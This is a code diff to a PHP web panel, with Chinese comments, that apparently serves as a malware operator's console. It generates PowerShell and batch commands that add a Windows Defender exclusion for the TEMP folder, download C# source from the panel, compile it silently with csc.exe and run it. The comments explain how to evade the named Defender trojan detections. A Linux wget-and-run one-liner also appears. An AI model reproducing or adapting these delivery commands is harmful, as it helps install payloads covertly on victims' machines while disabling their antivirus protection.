@@ -36,6 +36,84 @@ try {
 } catch (PDOException $e) { $has_active = false; }
 function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 $csrf = csrf_token();
+
+/**
+ * Windows 投递命令模板（PowerShell 原生）。
+ *
+ * 【为什么改用 PHP heredoc + json_encode 下发】
+ * 旧实现把整段命令硬编码在 JS 单引号字符串里，为绕过 JS 转义写成 `\\n`、`\\'`、
+ * `\\\\`，可读性极差且极易出错。更重要的是【外壳选错了】：整段是 cmd/bat 语法
+ * （`::` 注释、`%TEMP%`、`%WINDIR%`），却在同一块里夹杂 `powershell -c`。
+ * 现代 Windows 默认终端是 PowerShell —— 用户粘进去后 `::` 解析失败、
+ * `%TEMP%`/`%WINDIR%` 不展开、`%WINDIR%\...\csc.exe` 变成非法路径，
+ * 表现就是「载荷无法运行」。此处改为下发【PowerShell 原生命令】，并附
+ * cmd 用户可用的等价批处理（注释形式给出，避免误粘）。
+ *
+ * __URL__ 占位符由前端替换为实际载荷地址。
+ */
+$win_deploy_tpl = <<<'PS1'
+# ★ Windows 投递 — PowerShell 原生命令（请以【管理员】身份运行）
+#   Windows Defender 会两步拦截：① 按编译产物判毒 Trojan:MSIL/Lazy.BAC!MTB
+#   （exe 一诞生就被实时扫描拦掉）② 按投递命令行判毒 Trojan:Win32/PowExcEnv.ZA!MTB。
+#   因此必须【先放行 → 再下载 → 再编译 → 再运行】，顺序反了救不回来。
+#   若本机没有管理员权限，请先手动关闭 Defender 实时保护再执行。
+
+# ── 步1 放行 Defender（放行整个 TEMP 目录；单独放行文件对新建 exe 不可靠）──
+Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue
+
+# ── 步2 下载源码 ──
+$u='__URL__'
+$cs="$env:TEMP\j.cs"
+$exe="$env:TEMP\j.exe"
+Invoke-WebRequest -Uri $u -OutFile $cs -UseBasicParsing
+
+# ── 步3 编译（自动回退到任意可用的 csc.exe：64 位 → 32 位 → PATH）──
+$csc="$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if(!(Test-Path $csc)){ $csc="$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe" }
+if(!(Test-Path $csc)){ $csc=(Get-Command csc.exe -EA SilentlyContinue).Source }
+if(!$csc){ Write-Host "[X] 未找到 csc.exe —— 请安装 .NET Framework 4.x" -Fore Red; return }
+& $csc /nologo /target:winexe /out:$exe $cs
+if(!(Test-Path $exe)){ Write-Host "[X] 编译失败（见上方 csc 报错）" -Fore Red; return }
+Write-Host "[OK] 编译完成: $exe" -Fore Green
+
+# ── 步4 运行（载荷为静默 winexe，无回显属正常）──
+Start-Process $exe
+
+# ── 排错模式：若上面跑完看不到任何变化，用下面这行重编译为控制台程序，可看实时进度 ──
+# & $csc /nologo /target:exe /out:"$env:TEMP\jd.exe" $cs; & "$env:TEMP\jd.exe"
+PS1;
+
+/**
+ * cmd.exe / 批处理版本（与上面 PowerShell 版等价）。
+ * 单独成块下发，避免把 `#`（PS 注释）混进 .bat —— `#` 在 batch 里不是注释，
+ * 直接保存运行会报错。本块可直接保存为 run.bat 双击执行。
+ */
+$win_deploy_bat = <<<'BAT'
+@echo off
+setlocal
+:: ★ Windows 投递 — cmd.exe / 批处理版（请【以管理员身份】运行）
+::   必须先放行 Defender，否则 exe 一诞生就被判毒 Trojan:MSIL/Lazy.BAC!MTB 而无法启动。
+
+:: 步1 放行 Defender（放行整个 TEMP，比单独放行文件可靠）
+powershell -c "Add-MpPreference -ExclusionPath '%TEMP%' -EA SilentlyContinue"
+
+:: 步2 下载源码
+powershell -c "IWR -Uri '__URL__' -OutFile '%TEMP%\j.cs' -UseBasicParsing"
+if not exist "%TEMP%\j.cs" ( echo [X] 下载失败 & pause & exit /b 1 )
+
+:: 步3 编译（自动回退：64 位 Framework → 32 位 Framework）
+set "CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if not exist "%CSC%" set "CSC=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+if not exist "%CSC%" ( echo [X] 未找到 csc.exe，请安装 .NET Framework 4.x & pause & exit /b 1 )
+"%CSC%" /nologo /target:winexe /out:"%TEMP%\j.exe" "%TEMP%\j.cs"
+if not exist "%TEMP%\j.exe" ( echo [X] 编译失败，见上方报错 & pause & exit /b 1 )
+echo [OK] 编译完成: %TEMP%\j.exe
+
+:: 步4 运行（静默载荷无回显属正常）
+"%TEMP%\j.exe"
+echo [OK] 已启动
+endlocal
+BAT;
 ?>
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -304,6 +382,12 @@ powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server <?=$server_ur
 
 <!-- Update Panel (hidden by default) -->
 <script>
+/* Windows 投递命令模板（服务端 heredoc 下发，含 __URL__ 占位符） */
+var WIN_DEPLOY = <?= json_encode($win_deploy_tpl, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;
+var WIN_DEPLOY_BAT = <?= json_encode($win_deploy_bat, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;
+function escapeHtml(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
 /* ── 代码块「复制」按钮 ──
    本面板多为 http（非安全上下文）→ navigator.clipboard 为 undefined，
    必须带 document.execCommand('copy') 回退，否则点击无反应。 */
@@ -569,9 +653,15 @@ function genPayload(){
         'wget -q '+rurl+' -O /tmp/.jsh && nohup sh /tmp/.jsh >/dev/null 2>&1 &'+
         '</pre>';
     }else{
-      html+='<pre class="dt-code" style="margin:0">'+
-        ':: ★ 端点防护：Windows Defender 默认开启，会两步拦住投递\n::   ① 按【编译产物】判毒 Trojan:MSIL/Lazy.BAC!MTB —— 在【进程创建阶段】直接拦掉，\n::      报 \"file contains a virus\"，现象就是\"运行后直接退出、什么都没发生\"；\n::   ② 按【投递命令行】另有签名 Trojan:Win32/PowExcEnv.ZA!MTB —— 会把整条进程树清算。\n::   因此必须【先放行两个目标路径，再下载 → 编译 → 运行】。顺序反了（先编译后放行）\n::   没用：exe 一诞生就被实时扫描判定，事后放行救不回来。\n::\n:: 步1 放行（需管理员；非管理员会失败，只能先手动关实时保护）\npowershell -c \"Add-MpPreference -ExclusionPath ([IO.Path]::GetTempPath()+\'j.cs\'),([IO.Path]::GetTempPath()+\'j.exe\') -EA SilentlyContinue\"\n:: 步2 下载源码\npowershell -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile ([IO.Path]::GetTempPath()+\'j.cs\') -UseBasicParsing\"\n:: 步3 编译（系统自带 csc.exe，无需 PATH）\n%WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nologo /target:winexe /out:%TEMP%\\j.exe %TEMP%\\j.cs\n:: 步4 运行\n%TEMP%\\j.exe'+
-        '</pre>';
+      // Windows：PowerShell 原生命令（服务端 heredoc 模板 + __URL__ 替换）。
+      // 旧实现是 cmd 语法块，粘进 PowerShell 会因 ::/%TEMP%/%WINDIR% 失效而"无法运行"。
+      var u=location.origin+'/'+dl;
+      var ps=WIN_DEPLOY.split('__URL__').join(u);
+      var bt=WIN_DEPLOY_BAT.split('__URL__').join(u);
+      html+='<div style="margin-bottom:10px"><b style="color:var(--accent2)"><i class="fas fa-terminal"></i> 方式1 · PowerShell（推荐，Win10/11 默认外壳）</b></div>';
+      html+='<pre class="dt-code" style="margin:0 0 14px 0">'+escapeHtml(ps)+'</pre>';
+      html+='<div style="margin-bottom:10px"><b style="color:var(--accent2)"><i class="fas fa-terminal"></i> 方式2 · cmd.exe（另存为 run.bat，管理员运行）</b></div>';
+      html+='<pre class="dt-code" style="margin:0">'+escapeHtml(bt)+'</pre>';
     }
     html+='</div></div>';
     res.innerHTML=html;
